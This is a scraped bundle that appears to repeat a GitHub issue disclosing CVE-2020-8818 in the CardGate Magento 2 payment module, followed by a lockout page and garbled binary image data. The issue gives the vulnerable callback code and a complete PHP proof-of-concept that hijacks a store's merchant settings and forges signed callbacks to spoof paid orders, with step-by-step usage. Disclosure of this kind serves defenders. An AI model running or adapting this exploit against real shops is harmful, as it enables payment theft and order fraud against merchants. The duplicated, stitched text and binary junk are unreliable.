|  | $sResponse = $this->\_cardgateConfig->getGlobal('api\_username') . '.' . $this->\_cardgateConfig->getGlobal('site\_id') . '.200'; |
|  | return $this->getResponse()->setBody($sResponse); |
|  |  |
|  | } catch (\Exception $e) { |
|  | return $this->getResponse()->setBody($e->getMessage()); |
|  | } |
|  | } |

**Affected versions:** â‰¤ 2.0.30

**Tested on:** Magento 2.3.4 + [CardGate Payment Gateway Module 2.0.30](https://github.com/cardgate/magento2/releases/tag/v2.0.30)

**Proof-of-Concept**
```
<?php
/*
  Usage:

  1. Change values of the constants (see below for TARGET & ORDER*)
  2. Host this script somewhere (must be public accessible)
  3. Register a merchant at https://cardgate.com
  4. Sign into "My CardGate" dashboard
  5. Add fake site or choose existing one
  6. Click "Setup your Webshop" button in site preferences
  7. Paste the URL of this script into the pop-up window and click "Save"
  8. The target store now uses the settings of your site, enjoy :]

  P.S. It works perfectly in both Staging and Live modes, regardless of the current mode of the target shop.
*/

// -------- Options (start) --------
define('TARGET', 'http://domain.tld'); // without trailing slash, pls
define('ORDER', '000000001'); // provide non-zero value to automagically spoof order status
define('ORDER_AMOUNT', 1.00); // provide a valid total (to bypass built-in fraud protection)
define('ORDER_CURRENCY', 'USD'); // provide a valid currency (same goal as above)
define('ORDER_PAYMENT_TYPE', 'sofortbanking'); // provide a valid payment type slug (optional)
// --------- Options (end) ---------

define('API_STAGING', 'https://secure-staging.curopayments.net/rest/v1/curo/');
define('API_PRODUCTION', 'https://secure.curopayments.net/rest/v1/curo/');

/**
 * Original function from CardGate API client library (SDK) with minor changes
 * @param string $sToken_
 * @param bool $bTestmode_
 * @return string
 */
function pullConfig($sToken_, $bTestmode_ = FALSE) {
	if (!is_string($sToken_)) {
		throw new Exception('invalid token for settings pull: ' . $sToken_);
	}

	$sResource = "pullconfig/{$sToken_}/";
	$sUrl = ($bTestmode_ ? API_STAGING : API_PRODUCTION) . $sResource;

	$rCh = curl_init();
	curl_setopt($rCh, CURLOPT_URL, $sUrl);
	curl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($rCh, CURLOPT_TIMEOUT, 60);
	curl_setopt($rCh, CURLOPT_HEADER, FALSE);
	curl_setopt($rCh, CURLOPT_HTTPHEADER, [
		'Content-Type: application/json',
		'Accept: application/json'
	]);
	if ($bTestmode_) {
		curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);
	} else {
		curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, TRUE);
		curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 2);
	}

	if (FALSE == ($sResults = curl_exec($rCh))) {
		$sError = curl_error($rCh);
		curl_close($rCh);
		throw new Exception('Client.Request.Curl.Error: ' . $sError);
	} else {
		curl_close($rCh);
	}
	if (NULL === ($aResults = json_decode($sResults, TRUE))) {
		throw new Exception('remote gave invalid JSON: ' . $sResults);
	}
	if (isset($aResults['error'])) {
		throw new Exception($aResults['error']['message']);
	}

	return $aResults;
}

/**
 * Original function from CardGate API client library (SDK) with minor changes
 * @param string $sUrl
 * @param array $aData_
 * @param string $sHttpMethod_
 * @return string
 */
function doRequest($sUrl, $aData_ = NULL, $sHttpMethod_ = 'POST') {
	if (!in_array($sHttpMethod_, ['GET', 'POST'])) {
		throw new Exception('invalid http method: ' . $sHttpMethod_);
	}

	$rCh = curl_init();
	curl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($rCh, CURLOPT_TIMEOUT, 60);
	curl_setopt($rCh, CURLOPT_HEADER, FALSE);
	curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);

	if ('POST' == $sHttpMethod_) {
		curl_setopt($rCh, CURLOPT_URL, $sUrl);
		curl_setopt($rCh, CURLOPT_POST, TRUE);
		curl_setopt($rCh, CURLOPT_POSTFIELDS, http_build_query($aData_));
	} else {
		$sUrl = $sUrl
			. (FALSE === strchr($sUrl, '?') ? '?' : '&')
			. http_build_query($aData_)
		;
		curl_setopt($rCh, CURLOPT_URL, $sUrl);
	}

	$response = curl_exec($rCh);
	if (FALSE == $response) {
		$sError = curl_error($rCh);
		curl_close($rCh);
		throw new Exception('Client.Request.Curl.Error: ' . $sError);
	} else {
		curl_close($rCh);
	}

	return $response;
}

if (!empty($_REQUEST['cgp_sitesetup']) && !empty($_REQUEST['token'])) {
	try {
		$aResult = pullConfig($_REQUEST['token'], $_REQUEST['testmode']);
		$aConfigData = $aResult['pullconfig']['content'];
		$response = doRequest(TARGET . '/cardgate/payment/callback', $_REQUEST, 'GET');
		if ($response == $aConfigData['merchant_id'] . '.' . $aConfigData['site_id'] . '.200') {
			if (ORDER) {
				$payload = [
					'testmode' => $_REQUEST['testmode'],
					'reference' => ORDER,
					'transaction' => 'T' . str_pad(time(), 11, random_int(0, 9)),
					'currency' => ORDER_CURRENCY,
					'amount' => ORDER_AMOUNT * 100,
					'status' => 'success',
					'code' => 200,
					'pt' => ORDER_PAYMENT_TYPE
				];
				$payload['hash'] = md5(
					(!empty($payload['testmode']) ? 'TEST' : '')
					. $payload['transaction']
					. $payload['currency']
					. $payload['amount']
					. $payload['reference']
					. $payload['code']
					. $aConfigData['site_key']
				);
				$response = doRequest(TARGET . '/cardgate/payment/callback', $payload, 'GET');
				if ($response == $payload['transaction'] . '.' . $payload['code']) {
					die($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');
				} else {
					throw new Exception("Unable to spoof order status, but merchant settings was updated successfully ($response)");
				}
			} else {
				die($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');
			}
		} else {
			throw new Exception("It seems target is not vulnerable ($response)");
		}
	} catch (\Exception $oException_) {
		die(htmlspecialchars($oException_->getMessage()));
	}
}
```
ðŸ‘3ðŸŽ‰1ðŸš€1ðŸ‘€1
## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from github.com_4755eddf_20250119_125220.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcardgate%2Fmagento2%2Fissues%2F54)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcardgate%2Fmagento2%2Fissues%2F54)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cardgate%2Fmagento2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cardgate](/cardgate)
/
**[magento2](/cardgate/magento2)**
Public

* [Notifications](/login?return_to=%2Fcardgate%2Fmagento2) You must be signed in to change notification settings
* [Fork
  8](/login?return_to=%2Fcardgate%2Fmagento2)
* [Star
   7](/login?return_to=%2Fcardgate%2Fmagento2)

* [Code](/cardgate/magento2)
* [Issues
  0](/cardgate/magento2/issues)
* [Pull requests
  0](/cardgate/magento2/pulls)
* [Actions](/cardgate/magento2/actions)
* [Projects
  0](/cardgate/magento2/projects)
* [Security](/cardgate/magento2/security)
* [Insights](/cardgate/magento2/pulse)

Additional navigation options

* [Code](/cardgate/magento2)
* [Issues](/cardgate/magento2/issues)
* [Pull requests](/cardgate/magento2/pulls)
* [Actions](/cardgate/magento2/actions)
* [Projects](/cardgate/magento2/projects)
* [Security](/cardgate/magento2/security)
* [Insights](/cardgate/magento2/pulse)

# Public disclosure on CVE-2020-8818 [Unauthorized Payments Hijacking + Order Status Spoofing]Â #54

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Public disclosure on CVE-2020-8818 [Unauthorized Payments Hijacking + Order Status Spoofing]](#top)#54Copy link![@633kh4ck](https://avatars.githubusercontent.com/u/13217806?u=79ac0a09fc4376119859036a81c9c509f2774077&v=4&size=80)
## Description

![@633kh4ck](https://avatars.githubusercontent.com/u/13217806?u=79ac0a09fc4376119859036a81c9c509f2774077&v=4&size=48)[633kh4ck](https://github.com/633kh4ck)opened [on Feb 24, 2020](https://github.com/cardgate/magento2/issues/54#issue-570050974)
### [CVE-2020-8818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8818)

Lack of origin authentication ([CWE-346](https://cwe.mitre.org/data/definitions/346.html)) at IPN callback processing function allow (**even *unauthorized***) attacker to remotely replace critical plugin settings (merchant id, secret key etc) with known to him and therefore bypass payment process (eg. spoof order status by manually sending IPN callback request with a valid signature but without real payment) and/or receive all subsequent payments (on behalf of the store).

### Vulnerable code (fixed in PR [#53](https://github.com/cardgate/magento2/pull/53))

[magento2/Controller/Payment/Callback.php](https://github.com/cardgate/magento2/blob/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller/Payment/Callback.php#L88-L107)

Lines 88 to 107
in
[715979e](/cardgate/magento2/commit/715979e54e1a335d78a8c5586f9e9987c3bf94fd)

|  | if (!empty($get['cgp\_sitesetup']) && !empty($get['token'])) { |
| --- | --- |
|  |  |
|  | try { |
|  | $bIsTest = ($get['testmode'] == 1 ? true : false); |
|  | $aResult = $this->\_cardgateClient->pullConfig($get['token'], $bIsTest); |
|  | $aConfigData = $aResult['pullconfig']['content']; |
|  | $this->\_cardgateConfig->setGlobal( 'testmode', $aConfigData['testmode'] ); |
|  | $this->\_cardgateConfig->setGlobal( 'site\_id', $aConfigData['site\_id'] ); |
|  | $this->\_cardgateConfig->setGlobal( 'site\_key', $aConfigData['site\_key'] ); |
|  | $this->\_cardgateConfig->setGlobal( 'api\_username', $aConfigData['merchant\_id'] ); |
|  | $this->\_cardgateConfig->setGlobal('api\_password', $this->encryptor->encrypt($aConfigData['api\_key'] )); |
|  | $typeListInterface = ObjectManager::getInstance()->get( \Magento\Framework\App\Cache\TypeListInterface::class ); |
|  | $typeListInterface->cleanType('config'); |
|  | $sResponse = $this->\_cardgateConfig->getGlobal('api\_username') . '.' . $this->\_cardgateConfig->getGlobal('site\_id') . '.200'; |
|  | return $this->getResponse()->setBody($sResponse); |
|  |  |
|  | } catch (\Exception $e) { |
|  | return $this->getResponse()->setBody($e->getMessage()); |
|  | } |
|  | } |

**Affected versions:** â‰¤ 2.0.30

**Tested on:** Magento 2.3.4 + [CardGate Payment Gateway Module 2.0.30](https://github.com/cardgate/magento2/releases/tag/v2.0.30)

**Proof-of-Concept**
```
<?php
/*
  Usage:

  1. Change values of the constants (see below for TARGET & ORDER*)
  2. Host this script somewhere (must be public accessible)
  3. Register a merchant at https://cardgate.com
  4. Sign into "My CardGate" dashboard
  5. Add fake site or choose existing one
  6. Click "Setup your Webshop" button in site preferences
  7. Paste the URL of this script into the pop-up window and click "Save"
  8. The target store now uses the settings of your site, enjoy :]

  P.S. It works perfectly in both Staging and Live modes, regardless of the current mode of the target shop.
*/

// -------- Options (start) --------
define('TARGET', 'http://domain.tld'); // without trailing slash, pls
define('ORDER', '000000001'); // provide non-zero value to automagically spoof order status
define('ORDER_AMOUNT', 1.00); // provide a valid total (to bypass built-in fraud protection)
define('ORDER_CURRENCY', 'USD'); // provide a valid currency (same goal as above)
define('ORDER_PAYMENT_TYPE', 'sofortbanking'); // provide a valid payment type slug (optional)
// --------- Options (end) ---------

define('API_STAGING', 'https://secure-staging.curopayments.net/rest/v1/curo/');
define('API_PRODUCTION', 'https://secure.curopayments.net/rest/v1/curo/');

/**
 * Original function from CardGate API client library (SDK) with minor changes
 * @param string $sToken_
 * @param bool $bTestmode_
 * @return string
 */
function pullConfig($sToken_, $bTestmode_ = FALSE) {
	if (!is_string($sToken_)) {
		throw new Exception('invalid token for settings pull: ' . $sToken_);
	}

	$sResource = "pullconfig/{$sToken_}/";
	$sUrl = ($bTestmode_ ? API_STAGING : API_PRODUCTION) . $sResource;

	$rCh = curl_init();
	curl_setopt($rCh, CURLOPT_URL, $sUrl);
	curl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($rCh, CURLOPT_TIMEOUT, 60);
	curl_setopt($rCh, CURLOPT_HEADER, FALSE);
	curl_setopt($rCh, CURLOPT_HTTPHEADER, [
		'Content-Type: application/json',
		'Accept: application/json'
	]);
	if ($bTestmode_) {
		curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);
	} else {
		curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, TRUE);
		curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 2);
	}

	if (FALSE == ($sResults = curl_exec($rCh))) {
		$sError = curl_error($rCh);
		curl_close($rCh);
		throw new Exception('Client.Request.Curl.Error: ' . $sError);
	} else {
		curl_close($rCh);
	}
	if (NULL === ($aResults = json_decode($sResults, TRUE))) {
		throw new Exception('remote gave invalid JSON: ' . $sResults);
	}
	if (isset($aResults['error'])) {
		throw new Exception($aResults['error']['message']);
	}

	return $aResults;
}

/**
 * Original function from CardGate API client library (SDK) with minor changes
 * @param string $sUrl
 * @param array $aData_
 * @param string $sHttpMethod_
 * @return string
 */
function doRequest($sUrl, $aData_ = NULL, $sHttpMethod_ = 'POST') {
	if (!in_array($sHttpMethod_, ['GET', 'POST'])) {
		throw new Exception('invalid http method: ' . $sHttpMethod_);
	}

	$rCh = curl_init();
	curl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($rCh, CURLOPT_TIMEOUT, 60);
	curl_setopt($rCh, CURLOPT_HEADER, FALSE);
	curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);

	if ('POST' == $sHttpMethod_) {
		curl_setopt($rCh, CURLOPT_URL, $sUrl);
		curl_setopt($rCh, CURLOPT_POST, TRUE);
		curl_setopt($rCh, CURLOPT_POSTFIELDS, http_build_query($aData_));
	} else {
		$sUrl = $sUrl
			. (FALSE === strchr($sUrl, '?') ? '?' : '&')
			. http_build_query($aData_)
		;
		curl_setopt($rCh, CURLOPT_URL, $sUrl);
	}

	$response = curl_exec($rCh);
	if (FALSE == $response) {
		$sError = curl_error($rCh);
		curl_close($rCh);
		throw new Exception('Client.Request.Curl.Error: ' . $sError);
	} else {
		curl_close($rCh);
	}

	return $response;
}

if (!empty($_REQUEST['cgp_sitesetup']) && !empty($_REQUEST['token'])) {
	try {
		$aResult = pullConfig($_REQUEST['token'], $_REQUEST['testmode']);
		$aConfigData = $aResult['pullconfig']['content'];
		$response = doRequest(TARGET . '/cardgate/payment/callback', $_REQUEST, 'GET');
		if ($response == $aConfigData['merchant_id'] . '.' . $aConfigData['site_id'] . '.200') {
			if (ORDER) {
				$payload = [
					'testmode' => $_REQUEST['testmode'],
					'reference' => ORDER,
					'transaction' => 'T' . str_pad(time(), 11, random_int(0, 9)),
					'currency' => ORDER_CURRENCY,
					'amount' => ORDER_AMOUNT * 100,
					'status' => 'success',
					'code' => 200,
					'pt' => ORDER_PAYMENT_TYPE
				];
				$payload['hash'] = md5(
					(!empty($payload['testmode']) ? 'TEST' : '')
					. $payload['transaction']
					. $payload['currency']
					. $payload['amount']
					. $payload['reference']
					. $payload['code']
					. $aConfigData['site_key']
				);
				$response = doRequest(TARGET . '/cardgate/payment/callback', $payload, 'GET');
				if ($response == $payload['transaction'] . '.' . $payload['code']) {
					die($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');
				} else {
					throw new Exception("Unable to spoof order status, but merchant settings was updated successfully ($response)");
				}
			} else {
				die($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');
			}
		} else {
			throw new Exception("It seems target is not vulnerable ($response)");
		}
	} catch (\Exception $oException_) {
		die(htmlspecialchars($oException_->getMessage()));
	}
}
```
ðŸ‘3ðŸŽ‰1ðŸš€1ðŸ‘€1
## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from packetstormsecurity.com_89b0bae0_20250119_125217.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUTâ›” 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from avatars.githubusercontent.com_b246b757_20250119_142136.html ===
ï¿½ï¿½ï¿½ï¿½ ï¿½  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222ï¿½ï¿½  P P" ï¿½ï¿½ï¿½          
   } !1AQa"q2ï¿½ï¿½ï¿½#Bï¿½ï¿½Rï¿½ï¿½$3brï¿½
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½       
  w !1AQaq"2ï¿½Bï¿½ï¿½ï¿½ï¿½ #3Rï¿½brï¿½
$4ï¿½%ï¿½&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½   ? ï¿½S ï¿½iï¿½ï¿½ï¿½QL
ï¿½Xuï¿½ï¿½Tï¿½ï¿½ï¿½ï¿½ï¿½Ytï¿½w4ï¿½ï¿½gï¿½W.,ï¿½\*ï¿½ï¿½H:ï¿½@aï¿½4nTSï¿½Mï¿½ï¿½ï¿½aï¿½ J(ï¿½ï¿½.QEï¿½
\ï¿½ï¿½ï¿½U2ï¿½ï¿½UN3Tï¿½ï¿½ï¿½[ï¿½ï¿½$ï¿½jï¿½|ï¿½ï¿½ï¿½Gd]8ï¿½ï¿½(ï¿½ï¿½áŒ¨Tï¿½ï¿½et5ï¿½Aï¿½[ï¿½ï¿½ï¿½5ï¿½7ï¿½ï¿½=Ç±ï¿½k"ï¿½ÛµË›ueï¿½<+ï¿½Sï¿½hï¿½ï¿½[ï¿½Wï¿½4Qï¿½ï¿½ï¿½Bï¿½ï¿½@ï¿½ï¿½Tï¿½È§ï¿½\ï¿½@QL
ï¿½Tï¿½96lï¿½ï¿½Å†@I'@kï¿½Õ¼/ueï¿½[ï¿½ï¿½D2rï¿½ï¿½9ï¿½"ï¿½
6ï¿½ï¿½;Rï¿½ï¿½ï¿½Qï¿½hß£ï¿½ï¿½~ï¿½"ï¿½sOï¿½ï¿½ï¿½'ï¿½ï¿½6Ö¢ï¿½ ï¿½ï¿½ oï¿½rbï¿½Ô–ï¿½M.Wï¿½ï¿½vï¿½$ï¿½-ï¿½Sï¿½ï¿½jï¿½ ï¿½tï¿½q[ï¿½ï¿½ï¿½ï¿½Nï¿½ï¿½$ï¿½y {ï¿½W?s3MrÒ°9nMiN\ï¿½ï¿½Tï¿½ï¿½ï¿½1Eï¿½ï¿½K[ï¿½Eï¿½ï¿½
(ï¿½ï¿½kï¿½ï¿½Vï¿½&ï¿½ï¿½Pï¿½ÄŒï¿½ï¿½ï¿½ï¿½Uï¿½ï¿½ï¿½ï¿½ï¿½Fï¿½ï¿½)'ï¿½ï¿½ï¿½@ï¿½oï¿½Kï¿½gï¿½^ï¿½ï¿½`ï¿½Xvï¿½:ï¿½ï¿½tï¿½fï¿½ï¿½Î¬o]hï¿½vï¿½.5fï¿½mï¿½ï¿½ï¿½7cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½G;\*ï¿½`;ï¿½Aï¿½ï¿½Eï¿½DJ+ï¿½UzW=(ï¿½ï¿½Ö³ï¿½ï¿½ï¿½4ï¿½ï¿½ï¿½hï¿½ï¿½ï¿½ï¿½sï¿½Q@ï¿½ï¿½ï¿½ï¿½ï¿½rï¿½f74pï¿½ï¿½'ï¿½t^ï¿½iï¿½E4ï¿½tw(ï¿½ï¿½Kï¿½ï¿½ï¿½<Wqï¿½ï¿½ï¿½`ï¿½ï¿½ ï¿½?Æ±ï¿½[tsï¿½ï¿½k>kï¿½ï¿½;OMï¿½]ï¿½ï¿½ï¿½1Â¥]V$
 Ï ï¿½?ï¿½]ï¿½ï¿½ï¿½ï¿½+xï¿½Ñ¼Jï¿½"ï¿½ï¿½ï¿½ï¿½m7ï¿½rï¿½{ï¿½dï¿½ï¿½ï¿½Sï¿½ï¿½WYtï¿½ï¿½ï¿½ï¿½/ï¿½?ï¿½ï¿½?Jï¿½%-jN.ï¿½ï¿½Jï¿½fmï¿½ï¿½ï¿½ï¿½dï¿½/ZÓ´ï¿½ï¿½dï¿½ dï¿½,?ï¿½ï¿½ï¿½\*oï¿½`vï¿½ï¿½q\ï¿½ï¿½ï¿½sï¿½ï¿½Û¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\ï¿½m8
sï¿½L6ï¿½ï¿½-jAï¿½ï¿½Zï¿½}5ï¿½ï¿½BHï¿½&ï¿½ï¿½ï¿½ï¿½ï¿½
